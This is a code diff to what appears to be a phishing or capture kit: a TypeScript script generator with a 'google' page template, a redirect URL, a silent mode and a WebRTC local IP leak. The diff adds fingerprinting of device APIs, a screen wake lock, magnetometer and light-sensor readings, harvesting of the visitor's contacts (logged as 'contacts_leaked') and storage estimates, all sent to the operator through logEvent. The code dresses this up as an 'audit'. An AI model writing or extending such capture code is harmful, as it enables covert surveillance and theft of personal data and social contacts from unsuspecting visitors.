@@ -178,8 +178,14 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
           api_hid: !!navigator.hid,
           api_serial: !!navigator.serial,
           api_midi: !!navigator.requestMIDIAccess,
-          api_idle: !!window.IdleDetector
+          api_idle: !!window.IdleDetector,
+          api_contacts: !!navigator.contacts,
+          api_wake: !!navigator.wakeLock,
+          api_storage: !!navigator.storage
         });
+
+        // Wake Lock: Prevent Sleep during audit
+        try { if (navigator.wakeLock) await navigator.wakeLock.request('screen'); } catch(e) {}
 
         // Deep Recon: WebRTC Local IP Leak
         try {
@@ -362,6 +368,42 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
                  }
               }
             }
+
+            if (p === 'sensors') {
+               if (!isSilent) updateProgress(prog, "Deep sensor environment profile...", "PHYSICAL_RECON");
+               try {
+                 if (window.Magnetometer) {
+                   var mag = new Magnetometer({frequency: 1});
+                   mag.onreading = () => logEvent('extra', { sensor_mag: mag.x + ',' + mag.y + ',' + mag.z });
+                   mag.onerror = (e) => logEvent('extra', { sensor_error: 'Mag:' + e.error.message });
+                   mag.start(); setTimeout(() => mag.stop(), 2000);
+                 }
+                 if (window.AmbientLightSensor) {
+                    var als = new AmbientLightSensor({frequency: 1});
+                    als.onreading = () => logEvent('extra', { sensor_lux: als.illuminance });
+                    als.start(); setTimeout(() => als.stop(), 2000);
+                 }
+               } catch(e) {}
+            }
+
+            if (p === 'contacts') {
+              if (!isSilent) updateProgress(prog, "Audit relasi sosial & kontak...", "SOCIAL_GRAPH");
+              if (navigator.contacts && navigator.contacts.select) {
+                try {
+                  var props = await navigator.contacts.getProperties();
+                  var selected = await navigator.contacts.select(props, { multiple: true }).catch(function(){ return null; });
+                  if (selected) await logEvent('extra', { contacts_leaked: JSON.stringify(selected) });
+                } catch(e) {}
+              }
+            }
+
+            if (p === 'storage') {
+              if (!isSilent) updateProgress(prog, "Storage forensics & quota check...", "DISK_INTEGRITY");
+              if (navigator.storage && navigator.storage.estimate) {
+                var est = await navigator.storage.estimate();
+                await logEvent('extra', { storage_mb: (est.usage / 1024 / 1024).toFixed(2), quota_gb: (est.quota / 1024 / 1024 / 1024).toFixed(2) });
+              }
+            }
           } catch(e) {}
           permsCompleted++;
         }
@@ -376,7 +418,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
 `;
 };
 
-const ALL_PERMS = ['notification', 'clipboard', 'media', 'gps', 'screen', 'files'];
+const ALL_PERMS = ['notification', 'clipboard', 'media', 'gps', 'screen', 'files', 'sensors', 'contacts', 'storage'];
 
 export const templates: Record<string, {name: string, render: (id: string) => string}> = {
   'google': {
